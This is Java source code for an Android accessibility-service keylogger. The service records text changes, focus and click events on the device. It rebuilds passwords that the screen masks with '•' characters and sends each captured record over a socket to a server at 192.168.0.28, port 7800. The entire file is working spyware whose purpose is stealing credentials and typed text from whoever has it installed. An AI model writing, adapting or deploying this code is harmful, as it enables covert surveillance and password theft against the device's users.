package com.none.keylogger;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.os.AsyncTask;
import android.util.Log;

import java.io.OutputStream;
import java.io.PrintWriter;
import java.net.Socket;
import java.util.Calendar;
import java.text.SimpleDateFormat;
import java.text.DateFormat;
import java.util.Locale;

public class Keylogger extends AccessibilityService {

    String tempPassword = "";
    String latestChar = "";

    // send key information to a server
    private class SendToServerTask extends AsyncTask<String, Void, String> {
        Socket s;
        OutputStream dos;
        PrintWriter pw;

        @Override
        protected String doInBackground(String... params) {

            // input data
            String message = params[0];

            // remove •
            if (message.indexOf('•') >= 0){
                // add latestchar to get first char of password
                tempPassword += latestChar;
                latestChar = ""; // clear the latest char so that the first char is not added again

                message = message.replace('•', ' ');
                // 2018-11-16 23:09:59.334 11701-11868/com.none.keylogger D/info: 11/16/2018, 23:09:59 MST|TEXT|[p]
                String textOnly = message.split("TEXT")[1];
                // |[p]
                textOnly = textOnly.replace('|', ' ');
                textOnly = textOnly.replace('[', ' ');
                textOnly = textOnly.replace(']', ' ');
                textOnly = textOnly.trim();
                // p
                tempPassword += textOnly;

                // header
                String header = message.split("TEXT")[0];
                header += "TEXT|";
                // 2018-11-16 23:09:59.334 11701-11868/com.none.keylogger D/info: 11/16/2018, 23:09:59 MST|
                message = header + tempPassword;
                // 2018-11-16 23:09:59.334 11701-11868/com.none.keylogger D/info: 11/16/2018, 23:09:59 MST|TEXT|p
            } else {
                // if text event
                if (message.contains("TEXT")) {
                    // if there are no password chars, save the latest letter
                    // this helps provide the first letter in a password
                    latestChar = "";
                    String lastChar = message.split("TEXT")[1];
                    // |[p]
                    lastChar = lastChar.replace('|', ' ');
                    lastChar = lastChar.replace('[', ' ');
                    lastChar = lastChar.replace(']', ' ');
                    lastChar = lastChar.trim();
                    latestChar = lastChar;
                }
            }
            if (message.contains("CLICKED")){
                // clear vars on click
                tempPassword = "";
                latestChar = "";
            }



            // try a connection
            try {
                Log.d("Socket:", "Connecting...");
                s = new Socket("192.168.0.28", 7800); //ip, port
                s.setSoTimeout(1000);
                Log.d("Socket:", "Connected.");
                dos = s.getOutputStream();
                pw = new PrintWriter(dos);
                Log.d("Socket:", "Writing...");
                pw.println(message);
                pw.write(message);
                pw.flush();
                pw.close();
                s.close();
                Log.d("Socket:", "Data Sent.");

            } catch (Exception e) {
                e.printStackTrace();
            }

            // for now, write to dmessage
            Log.d("info", message);
            return params[0];
        }
    }

    @Override
    public void onServiceConnected() {
        Log.d("Keylogger", "Starting service");
    }

    // information gathering
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {

        // get datetime of event
        DateFormat df = new SimpleDateFormat("MM/dd/yyyy, HH:mm:ss z", Locale.US);
        String time = df.format(Calendar.getInstance().getTime());

        // switch on the event type to determine action
        switch(event.getEventType()) {
//            case AccessibilityEvent.TYPE_TOUCH_INTERACTION_START: {
//                // get data from event
//                String data = event.getText().toString();
//                // send data to server
//                SendToServerTask sendTask = new SendToServerTask();
//                sendTask.execute(time + "|TOUCH|" + data);
//                break;
//            }

            // view text change
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED: {
                // get data from event
                String data = event.getText().toString();
                // send data to server
                SendToServerTask sendTask = new SendToServerTask();
                sendTask.execute(time + "|TEXT|" + data);
                break;
            }
            // focus change
            case AccessibilityEvent.TYPE_VIEW_FOCUSED: {
                // get data from event
                String data = event.getText().toString();
                // send data to server
                SendToServerTask sendTask = new SendToServerTask();
                sendTask.execute(time + "|FOCUSED|" + data);
                break;
            }
            // view clicked
            case AccessibilityEvent.TYPE_VIEW_CLICKED: {
                // get event data
                String data = event.getText().toString();
                // send data to a server
                SendToServerTask sendTask = new SendToServerTask();
                sendTask.execute(time + "|CLICKED|" + data);
                break;
            }
            default:
                break;
        }
    }

    @Override
    public void onInterrupt() {

    }
}
